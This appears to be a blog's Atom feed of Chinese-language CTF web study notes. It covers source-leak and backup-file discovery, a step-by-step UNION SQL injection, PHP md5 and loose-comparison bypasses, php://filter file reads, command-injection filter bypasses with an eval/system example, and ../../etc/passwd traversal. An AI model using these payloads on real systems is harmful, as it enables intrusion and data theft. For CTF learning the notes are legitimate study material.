@@ -1,0 +1,600 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Tsunamori&#39;s blog</title>
+  
+  
+  <link href="https://tsunamori.github.io/atom.xml" rel="self"/>
+  
+  <link href="https://tsunamori.github.io/"/>
+  <updated>2021-04-26T09:01:33.889Z</updated>
+  <id>https://tsunamori.github.io/</id>
+  
+  <author>
+    <name>Tsunamori</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Notes_0 to 1 the road of CTFer</title>
+    <link href="https://tsunamori.github.io/wiki/Notes_0-to-1-the-road-of-CTFer/"/>
+    <id>https://tsunamori.github.io/wiki/Notes_0-to-1-the-road-of-CTFer/</id>
+    <published>2021-04-26T05:49:07.000Z</published>
+    <updated>2021-04-26T09:01:33.889Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="第一章-Web入门"><a href="#第一章-Web入门" class="headerlink" title="第一章 Web入门"></a>第一章 Web入门</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><h4 id="git泄漏"><a href="#git泄漏" class="headerlink" title="git泄漏"></a>git泄漏</h4><ol><li>常规git泄漏：flag在源码内，可直接利用工具或脚本获取。</li><li>git回滚：flag被修改，但依然保存在commit记录里。<ul><li>利用<code>git reset --hard [版本号]</code>获取flag。</li><li>更简单的方法是通过<code>git log-stat</code>查看每个commit修改了哪些文件，再用<code>git diff HEAD [commit-id]</code>比较当前版本和想看的commit之间的变化。</li></ul></li><li>git分支：命令<code>git reflog</code>查看分支间切换的记录。从原url下载分支内容并恢复（目前的恢复分支记录需要下载分支HEAD并修改GitHacker.py代码实现自动恢复分支，先简单记录下来，后续看是否有其它更简单的方式。）</li><li>git stash：stash是对当前工作的“保存”，以备后续恢复。<code>git stash list</code>查看保存的列表，<code>git stash pop</code>恢复工作现场，<code>git stash show</code>显示做了哪些改动。</li><li>git index：index是暂存区，用于通过git add .命令暂存新建文件等待commit。使用<code>git checkout-index</code>命令恢复文件。</li><li>git泄漏的其他利用方式：泄漏的git中也可能有其他有用的信息。<ul><li>.git/config文件夹中可能含有access_token信息，从而访问该用户的其它仓库。</li></ul></li></ol><h4 id="SVN泄漏"><a href="#SVN泄漏" class="headerlink" title="SVN泄漏"></a>SVN泄漏</h4><p>SVN是源代码版本管理软件，如果存在泄漏，可以利用.svn/entries或wc.db文件获取服务器源码等信息。</p><ul><li><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li><li>Seay-svn（Win）</li></ul><h4 id="HG泄漏"><a href="#HG泄漏" class="headerlink" title="HG泄漏"></a>HG泄漏</h4><p>.hg隐藏文件中包含代码和分支修改记录等信息。</p><ul><li><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>CTF线上赛往往会有重定向的问题，例如，只要访问<code>.git</code>便会返回403,此时访问<code>.git/config</code>，如果有文件内容返回，说明存在git泄漏，反之，一般不存在。而在SVN泄漏中，一般是在entries中爬取源代码，但有时会出现entries为空的情况，这时注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。</p><h3 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h3><h4 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h4><p>在Linux下，用gedit编辑器保存文件后，当前目录下会生成一个<code>[文件名]~</code>的备份文件，访问这个文件即可获得文件内容。</p><h4 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h4><p>vim在意外退出时会生成一个备份文件，文件名格式为<code>.filename.swp</code>，再次生成备份文件时则为<code>.filename.swo</code>，第三次为<code>.filename.swn</code>，以此类推。恢复备份的办法是，先在当前目录下创建一个flag文件，再使用<code>vim-r flag</code>，即可恢复.flag.swp。</p><h4 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h4><p>主要靠丰富字典。(dirsearch+自己收集字典)</p><ul><li>phpinfo()</li><li>备份文件后缀<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">back.rar</span><br><span class="line">back.tar</span><br><span class="line">back.tar.gz</span><br><span class="line">back.zip</span><br><span class="line">backup.rar</span><br><span class="line">backup.tar</span><br><span class="line">backup.tar.gz</span><br><span class="line">backup.zip</span><br><span class="line">temp.rar</span><br><span class="line">temp.tar</span><br><span class="line">temp.tar.gz</span><br><span class="line">temp.zip</span><br><span class="line">web.rar</span><br><span class="line">web.tar</span><br><span class="line">web.tar.gz</span><br><span class="line">web.zip</span><br><span class="line">website.rar</span><br><span class="line">website.tar</span><br><span class="line">website.tar.gz</span><br><span class="line">website.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar</span><br><span class="line">www.tar.gz</span><br><span class="line">www.zip</span><br><span class="line">wwwroot.rar</span><br><span class="line">wwwroot.tar</span><br><span class="line">wwwroot.tar.gz</span><br><span class="line">wwwroot.zip</span><br><span class="line">index.php.bak</span><br></pre></td></tr></table></figure></li></ul><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>线上赛过程中，出题人往往会在线运维题目，有时会导致swp备份文件的生成。所以读者在比赛过程中可以编写实时监控脚本，对题目服务进行监控。</p><h3 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h3><p>在线上赛中，网站的Banner对解题有着十分重要的作用，选手往往可以通过Banner信息来获得解题思路。<br>如得知网站是用ThinkPHP的Web框架编写时，我们可以尝试ThinkPHP框架的相关历史漏洞。或者得知这个网站是Windows服务器，那么我们在测试上传漏洞时可以根据Windows的特性进行尝试。</p><h4 id="自行收集指纹库"><a href="#自行收集指纹库" class="headerlink" title="自行收集指纹库"></a>自行收集指纹库</h4><ul><li>Github CMS指纹库</li><li>扫描器识别</li></ul><h4 id="使用已有工具"><a href="#使用已有工具" class="headerlink" title="使用已有工具"></a>使用已有工具</h4><ul><li>Wappalyzer（pip install python-Wappalyzer）：在data目录下，apps.json是其规则库，读者可以根据自己需求自由添加。</li></ul><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>除了以上两种识别方式，我们还可以通过随意输入一些URL，观察404和302跳转页面中是否包含CMS及版本号。</p><h2 id="CTF中的SQL注入"><a href="#CTF中的SQL注入" class="headerlink" title="CTF中的SQL注入"></a>CTF中的SQL注入</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;第一章-Web入门&quot;&gt;&lt;a href=&quot;#第一章-Web入门&quot; class=&quot;headerlink&quot; title=&quot;第一章 Web入门&quot;&gt;&lt;/a&gt;第一章 Web入门&lt;/h1&gt;&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerli</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="119 Notes" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/119-Notes/"/>
+    
+    
+    <category term="Notes" scheme="https://tsunamori.github.io/tags/Notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF SQLI</title>
+    <link href="https://tsunamori.github.io/wiki/CTF_SQLI/"/>
+    <id>https://tsunamori.github.io/wiki/CTF_SQLI/</id>
+    <published>2021-04-25T09:12:07.000Z</published>
+    <updated>2021-04-26T05:58:25.320Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="手注流程"><a href="#手注流程" class="headerlink" title="手注流程"></a>手注流程</h3><ol><li><p>页面里有一个POST表单，测试会不会有注入漏洞<br> POST里<br> id=1’和id=1’#<br> id=1’ and 1=2#和id=1’ and 1=1#<br> 前一个不回显后一个回显，那么说明存在注入。</p></li><li><p>判断字段数：有四个字段<br> id=1’ order by 4#</p></li><li><p>判断回显位：<br> id=1’ union select 1,2,3,4# 有正常回显<br> id=1’ union select 1,2,3# 无回显，证明该数据库在第四位，查询该数据库名</p></li><li><p>id=0’ union select 1,2,3,database()# 查到表名为skctf，继续查数据表（tables）名</p></li><li><p>id=0’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=’skctf’#</p></li><li><p>id=0’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p></li><li><p>查询数据：<br> id=0’ union select 1,2,3,skctf_flag from fl4g#<br> 得到flag。</p></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;手注流程&quot;&gt;&lt;a href=&quot;#手注流程&quot; class=&quot;headerlink&quot; title=&quot;手注流程&quot;&gt;&lt;/a&gt;手注流程&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;页面里有一个POST表单，测试会不会有注入漏洞&lt;br&gt; POST里&lt;br&gt; id=1’和id=1’#&lt;br</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
+    
+    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
+    
+    
+    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF MD5</title>
+    <link href="https://tsunamori.github.io/wiki/CTF_MD5/"/>
+    <id>https://tsunamori.github.io/wiki/CTF_MD5/</id>
+    <published>2021-04-25T02:30:06.000Z</published>
+    <updated>2021-04-26T05:59:49.336Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="MD5-函数数组绕过"><a href="#MD5-函数数组绕过" class="headerlink" title="MD5()函数数组绕过"></a>MD5()函数数组绕过</h4><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">include_once “flag.php”;</span><br><span class="line">ini_set(“display_errors”, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[‘REQUEST_URI’], ‘?’);&#x2F;&#x2F;返回$_SERVER[‘REQUEST_URI’]内从‘?’后开始的值。</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line">$str &#x3D; str_replace(‘key’,”,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">echo $flag.”取得flag”;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>绕过方法：</li></ol><ul><li> 对key关键词的过滤可以用kekeyy绕过，从而传递key1&amp;key2进行比较。</li><li> md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</li><li> 利用==比较漏洞,如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。下列的字符串的MD5值都是0e开头的：<br><code>QNKCDZO</code><br><code>240610708</code><br><code>s878926199a</code><br><code>s155964671a</code><br><code>s214587387a</code><br><code>s214587387a</code></li></ul><p>ref: <a href="https://blog.csdn.net/zpy1998zpy/article/details/80582974">https://blog.csdn.net/zpy1998zpy/article/details/80582974</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h4 id=&quot;MD5-函数数组绕过&quot;&gt;&lt;a href=&quot;#MD5-函数数组绕过&quot; class=&quot;headerlink&quot; title=&quot;MD5()函数数组绕过&quot;&gt;&lt;/a&gt;MD5()函数数组绕过&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;figure class=&quot;highlight plain</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
+    
+    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
+    
+    
+    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF back-up-logs</title>
+    <link href="https://tsunamori.github.io/wiki/CTF_back-up-logs/"/>
+    <id>https://tsunamori.github.io/wiki/CTF_back-up-logs/</id>
+    <published>2021-04-25T02:09:20.000Z</published>
+    <updated>2021-04-26T07:34:40.252Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="文件后缀"><a href="#文件后缀" class="headerlink" title="文件后缀"></a>文件后缀</h4><p>back.rar<br>back.tar<br>back.tar.gz<br>back.zip<br>backup.rar<br>backup.tar<br>backup.tar.gz<br>backup.zip<br>temp.rar<br>temp.tar<br>temp.tar.gz<br>temp.zip<br>web.rar<br>web.tar<br>web.tar.gz<br>web.zip<br>website.rar<br>website.tar<br>website.tar.gz<br>website.zip<br><a href="http://www.rar/">www.rar</a><br><a href="http://www.tar/">www.tar</a><br><a href="http://www.tar.gz/">www.tar.gz</a><br><a href="http://www.zip/">www.zip</a><br>wwwroot.rar<br>wwwroot.tar<br>wwwroot.tar.gz<br>wwwroot.zip<br>index.php.bak</p><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p><a href="https://www.freebuf.com/sectool/202350.html">https://www.freebuf.com/sectool/202350.html</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h4 id=&quot;文件后缀&quot;&gt;&lt;a href=&quot;#文件后缀&quot; class=&quot;headerlink&quot; title=&quot;文件后缀&quot;&gt;&lt;/a&gt;文件后缀&lt;/h4&gt;&lt;p&gt;back.rar&lt;br&gt;back.tar&lt;br&gt;back.tar.gz&lt;br&gt;back.zip&lt;br&gt;backup.rar&lt;</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
+    
+    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
+    
+    
+    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF_Tools</title>
+    <link href="https://tsunamori.github.io/wiki/CTF-Tools/"/>
+    <id>https://tsunamori.github.io/wiki/CTF-Tools/</id>
+    <published>2021-04-23T08:48:56.000Z</published>
+    <updated>2021-04-26T06:28:08.428Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>在线正则表达式  <a href="https://regex101.com/r/cT1rB2/1">https://regex101.com/r/cT1rB2/1</a></li><li>CTF在线工具 <a href="http://ctf.ssleye.com/">http://ctf.ssleye.com/</a></li><li>js美化 <a href="https://beautifier.io/">https://beautifier.io/</a></li></ol><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><ol><li>查看常用CTF文件是否存在于网站中：<a href="https://github.com/WangYihang/SourceLeakHacker">https://github.com/WangYihang/SourceLeakHacker</a></li><li>常规git泄漏：<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;在线正则表达式  &lt;a href=&quot;https://regex101.com/r/cT1rB2/1&quot;&gt;https://regex101.com/r/cT1rB2/1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;CTF在线工具 &lt;a href=&quot;http://ctf.ssleye.</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
+    
+    
+    <category term="Tools" scheme="https://tsunamori.github.io/tags/Tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF PHP</title>
+    <link href="https://tsunamori.github.io/wiki/CTF_PHP/"/>
+    <id>https://tsunamori.github.io/wiki/CTF_PHP/</id>
+    <published>2021-04-23T01:51:12.000Z</published>
+    <updated>2021-04-26T05:58:19.984Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="PHP-变形绕过"><a href="#PHP-变形绕过" class="headerlink" title="PHP 变形绕过"></a>PHP 变形绕过</h3><ol><li><code>==</code>比较双方都是数字或数字字符串（a string which can be interperted as int or float）<ul><li>var_dump(0 == “a”); // 0 == 0 -&gt; true</li><li>var_dump(“1” == “01”); // 1 == 1 -&gt; true</li><li>var_dump(“10” == “1e1”); // 10 == 10 -&gt; true</li><li>var_dump(100 == “1e2”); // 100 == 100 -&gt; true</li><li>0==’0’ //true</li><li>0 == ‘abcdefg’ //true</li><li>0 === ‘abcdefg’ //false</li><li>1 == ‘1abcdef’ //true</li></ul></li></ol><h3 id="PHP-Eval"><a href="#PHP-Eval" class="headerlink" title="PHP Eval"></a>PHP Eval</h3><ol><li>eval()内参数数目不限，彼此之间用分号隔开。</li></ol><h3 id="PHP-环境变量和系统变量"><a href="#PHP-环境变量和系统变量" class="headerlink" title="PHP 环境变量和系统变量"></a>PHP 环境变量和系统变量</h3><ol><li>常用环境变量和系统变量：<ul><li><a href="https://blog.csdn.net/liubing300/article/details/6883715">https://blog.csdn.net/liubing300/article/details/6883715</a></li><li>$GLOBALS:包含了全部变量的全局组合数组。</li></ul></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;PHP-变形绕过&quot;&gt;&lt;a href=&quot;#PHP-变形绕过&quot; class=&quot;headerlink&quot; title=&quot;PHP 变形绕过&quot;&gt;&lt;/a&gt;PHP 变形绕过&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;==&lt;/code&gt;比较双方都是数字或数字字符串（a string w</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
+    
+    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
+    
+    
+    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>错题wp集</title>
+    <link href="https://tsunamori.github.io/wiki/CTF_%E9%94%99%E9%A2%98%E9%9B%86/"/>
+    <id>https://tsunamori.github.io/wiki/CTF_%E9%94%99%E9%A2%98%E9%9B%86/</id>
+    <published>2021-04-22T06:57:37.000Z</published>
+    <updated>2021-04-25T09:42:01.663Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>SUCTF 2019 EasySQL <a href="https://blog.csdn.net/qq_43619533/article/details/103434935">https://blog.csdn.net/qq_43619533/article/details/103434935</a><ul><li> 考点： 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||</li></ul></li><li>BugKu web 21 <a href="https://blog.csdn.net/qq_41333578/article/details/92759619">https://blog.csdn.net/qq_41333578/article/details/92759619</a><ul><li> 考点： 弱比较的绕过; PHP伪协议php://input如何输入请求主体; eregi绕过的两种方式; 注意<code>\x00</code>会截断后续内容，而%00不会。</li></ul></li><li>BugKu 冬至红包 <a href="https://blog.csdn.net/qq_46230755/article/details/112973722">https://blog.csdn.net/qq_46230755/article/details/112973722</a><ul><li> 考点： 新姿势</li></ul></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;SUCTF 2019 EasySQL &lt;a href=&quot;https://blog.csdn.net/qq_43619533/article/details/103434935&quot;&gt;https://blog.csdn.net/qq_43619533/article/</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
+    
+    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
+    
+    
+    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JavaScript</title>
+    <link href="https://tsunamori.github.io/wiki/JavaScript/"/>
+    <id>https://tsunamori.github.io/wiki/JavaScript/</id>
+    <published>2021-04-22T06:33:21.000Z</published>
+    <updated>2021-04-26T07:51:19.353Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="JavaScript原型链污染攻击"><a href="#JavaScript原型链污染攻击" class="headerlink" title="JavaScript原型链污染攻击"></a>JavaScript原型链污染攻击</h3><p><a href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;JavaScript原型链污染攻击&quot;&gt;&lt;a href=&quot;#JavaScript原型链污染攻击&quot; class=&quot;headerlink&quot; title=&quot;JavaScript原型链污染攻击&quot;&gt;&lt;/a&gt;JavaScript原型链污染攻击&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;h</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTTP request</title>
+    <link href="https://tsunamori.github.io/wiki/HTTP-request/"/>
+    <id>https://tsunamori.github.io/wiki/HTTP-request/</id>
+    <published>2021-04-21T03:32:06.000Z</published>
+    <updated>2021-04-23T02:37:50.396Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li>同时提交get和post请求： 链接上提供get请求参数，请求末尾加入post请求参数，发送的请求仍为post请求。<ul><li><a href="https://blog.csdn.net/qq_32642035/article/details/104747362">https://blog.csdn.net/qq_32642035/article/details/104747362</a></li></ul></li><li> HTTP gzip: burp有自动解码gzip的功能。</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;同时提交get和post请求： 链接上提供get请求参数，请求末尾加入post请求参数，发送的请求仍为post请求。&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/qq_32642035/article/details/10474</summary>
+      
+    
+    
+    
+    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
+    
+    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
+    
+    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
+    
+    
+    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF PHP-RCE</title>
+    <link href="https://tsunamori.github.io/wiki/CTF_PHP-RCE/"/>
+    <id>https://tsunamori.github.io/wiki/CTF_PHP-RCE/</id>
+    <published>2021-04-20T08:22:46.000Z</published>
+    <updated>2021-04-26T07:34:51.940Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ol><li>文件包含命令执行 <a href="https://xz.aliyun.com/t/5535">https://xz.aliyun.com/t/5535</a><ul><li> <a href="https://blog.csdn.net/nai_kai/article/details/106805220">https://blog.csdn.net/nai_kai/article/details/106805220</a></li></ul></li><li> PHP伪协议（php://） <a href="https://www.jianshu.com/p/0a8339fcc269">https://www.jianshu.com/p/0a8339fcc269</a></li><li> 文件包含漏洞利用 <a href="https://blog.csdn.net/qq_32393893/article/details/110228864">https://blog.csdn.net/qq_32393893/article/details/110228864</a></li><li>远程文件包含漏洞（Remote File Inclusion RFI）:<ul><li> PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(Remote File Inclusion RFI)”。</li><li> allow_url_fopen = On 是否允许打开远程文件; allow_url_include = On 是否允许include/require远程文件</li><li> 远程文件包含webshell <a href="https://www.jianshu.com/p/be68cf9be911">https://www.jianshu.com/p/be68cf9be911</a></li></ul></li><li>RCE find the file by name in linux<ul><li> <a href="https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/">https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/</a></li><li> <a href="https://www.linux.com/topic/desktop/how-search-files-linux-command-line/">https://www.linux.com/topic/desktop/how-search-files-linux-command-line/</a></li></ul></li><li>在不能直接获取文件时，使用php://filter/read=convert.base64-encode/resource=test.php绕过获取文件内容<ul><li>如读取文件限制为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">   if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;; &#x2F;&#x2F;不能直接读取绝对路径</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"> include($file); &#x2F;&#x2F;include不能包含自身，会死循环，故拒绝访问。</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><ol><li> <a href="https://blog.csdn.net/u014549283/article/details/81783164">https://blog.csdn.net/u014549283/article/details/81783164</a></li><li> <a href="https://zhuanlan.zhihu.com/p/127047303">https://zhuanlan.zhihu.com/p/127047303</a></li><li> <a href="https://www.codenong.com/cs110213257/">https://www.codenong.com/cs110213257/</a></li><li> <a href="https://www.anquanke.com/post/id/208398">https://www.anquanke.com/post/id/208398</a></li><li> ${HOME:0:1} = / (获取目录分割符绕过过滤)</li><li> <a href="https://www.cnblogs.com/Tkitn/p/11661017.html">https://www.cnblogs.com/Tkitn/p/11661017.html</a></li><li> <a href="https://blog.csdn.net/qq_45927819/article/details/109671655">https://blog.csdn.net/qq_45927819/article/details/109671655</a></li><li> 管道符（; | || &amp; &amp;&amp;）过滤绕过：换行符%0a</li><li> 空格绕过：%20(目前做题最好使的一个绕过，&lt;&gt;经常不成功)</li><li> 关键词绕过：引号需要每个字母之间添加引号’或”，加<code>\</code>的话只需要加一个,cat可以用tac代替。</li><li> 文件读取不能用cat的替代：show_source(‘flag.php’)</li><li>Eval命令绕过利用，eval()内参数数目不限，彼此之间用分号隔开。<ul><li> eval( “var_dump($a);”); -&gt; eval( “var_dump(1),system(‘ls’);”);</li></ul></li><li> Assert()命令执行漏洞：</li><li> var_dump(<code>vi flag.php</code>)</li><li> 不允许输入标点符号，只允许数字和大小写，读取文件：$$args -&gt; $args = GLOBALS</li></ol><h3 id="Webshell-RCE-绕过"><a href="#Webshell-RCE-绕过" class="headerlink" title="Webshell RCE 绕过"></a>Webshell RCE 绕过</h3><ol><li><a href="https://xz.aliyun.com/t/8354">https://xz.aliyun.com/t/8354</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></li><li>不包含字母和数字： <a href="https://cloud.tencent.com/developer/article/1186230">https://cloud.tencent.com/developer/article/1186230</a></li></ol><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><ol><li>../../etc/passwd<ul><li><a href="https://www.freebuf.com/vuls/247620.html">https://www.freebuf.com/vuls/247620.html</a></li></ul></li></ol>]]></content>
+    
+    
+      
+      
